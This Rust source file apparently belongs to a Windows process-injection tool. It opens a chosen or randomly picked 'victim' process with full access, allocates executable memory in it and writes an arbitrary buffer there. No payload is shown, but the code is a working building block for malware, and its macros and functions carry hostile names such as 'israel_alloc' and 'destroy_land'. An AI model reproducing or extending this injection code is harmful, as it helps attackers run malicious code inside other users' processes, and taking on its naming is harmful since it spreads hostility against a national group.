use core::ffi::c_void;

use windows::Win32::{
    Foundation::{CloseHandle, HANDLE},
    System::{
        Diagnostics::Debug::WriteProcessMemory,
        Memory::{
            MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PAGE_PROTECTION_FLAGS,
            VIRTUAL_ALLOCATION_TYPE, VirtualAllocEx,
        },
        Threading::{OpenProcess, PROCESS_ALL_ACCESS},
    },
};

use crate::{err::AllocErr, proc::ProcessSnapshot};

#[derive(Debug)]
pub struct ProcessMemoryInfo {
    pub victim_process_id: u32,
    pub block_ptr: *mut c_void,
}

pub struct ProcessClassification {
    pub process_id: u32,
}

pub struct AllocationWrapper {}

#[macro_export]
macro_rules! israel_alloc {
    ($p:expr,$seg:expr) => {
        AllocationWrapper::new().israel_alloc($p, $seg)
    };
}

#[macro_export]
macro_rules! destroy_land {
    ($p:expr, $buf:expr, $size:expr) => {
        AllocationWrapper::new().israel_commit(&$p, $buf, $size)
    };
}

impl AllocationWrapper {
    pub fn new() -> Self {
        Self {}
    }

    fn close_handle(&mut self, handle: &HANDLE) {
        unsafe {
            let _ = CloseHandle(*handle);
        }
    }

    fn resolve_process_handle(&self, id: u32) -> Result<HANDLE, AllocErr> {
        unsafe {
            match OpenProcess(PROCESS_ALL_ACCESS, false, id) {
                Ok(k) => Ok(k),
                Err(_) => Err(AllocErr::ProcessReolveError),
            }
        }
    }

    /// Allocate a block of size `usize`. If you instead would like to commit a block
    /// to a SPECIFIC process, you may pass your own `ProcessClassification`.
    ///
    /// The returned `ProcessMemoryInfo` contains where the block starts,
    /// as well as the process ID of the victim process.
    ///
    /// Warning: This isnt a safe operation if you are using randomized
    /// process grabbing.
    pub fn israel_alloc(
        &mut self,
        size: usize,
        proc_inf: Option<ProcessClassification>,
    ) -> Option<ProcessMemoryInfo> {
        let mut rproc = ProcessSnapshot::new();

        let p_id = match proc_inf {
            Some(id_val) => id_val.process_id,
            None => rproc.find_random_process_id(),
        };

        let raw_handle_ptr = match self.resolve_process_handle(p_id) {
            Ok(handle) => handle,
            Err(err) => panic!("{}", err),
        };

        let ptr: *mut c_void = unsafe {
            VirtualAllocEx(
                raw_handle_ptr,
                None,
                size,
                VIRTUAL_ALLOCATION_TYPE(MEM_COMMIT.0 | MEM_RESERVE.0),
                PAGE_PROTECTION_FLAGS(PAGE_EXECUTE_READWRITE.0),
            )
        };

        self.close_handle(&raw_handle_ptr);

        Some(ProcessMemoryInfo {
            victim_process_id: p_id,
            block_ptr: ptr,
        })
    }

    /// Commit a win32 write operation to the provided block.
    /// This block is identified based on the provided `ProcessMemoryInfo`.
    ///
    /// Warning: Due to the nature of this program, somtimes the HANDLE may be invalid.
    /// Due to this, we recommend you pay attention to the returned `Result`.
    pub fn israel_commit(
        &mut self,
        atk: &ProcessMemoryInfo,
        buff: *const c_void,
        size: usize,
    ) -> Result<(), AllocErr> {
        let block_start = atk.block_ptr;
        let p_id = atk.victim_process_id;

        match self.resolve_process_handle(p_id) {
            Ok(k) => unsafe {
                match WriteProcessMemory(k, block_start, buff, size, None) {
                    Ok(_) => {
                        self.close_handle(&k);
                        Ok(())
                    }
                    Err(_) => {
                        self.close_handle(&k);
                        Err(AllocErr::BlockWriteFailure)
                    }
                }
            },
            Err(err) => Err(err),
        }
    }
}
